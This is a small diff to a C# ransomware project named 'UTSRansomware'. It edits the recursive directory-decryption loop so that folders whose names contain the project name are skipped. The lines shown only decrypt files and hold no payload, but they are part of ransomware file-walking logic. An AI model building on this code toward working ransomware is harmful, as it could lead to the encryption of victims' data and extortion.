@@ -64,7 +64,10 @@ namespace UTSRansomware
             // Loops over all subfolders and recursively calls itself
             foreach (string directoryPath in directoryPaths)
             {
-                DecryptDirectory(directoryPath);
+                if (!directoryPath.Contains("UTSRansomware"))
+                {
+                    DecryptDirectory(directoryPath);
+                }
             }
 
             // Using multi threaded processing to try improve speed
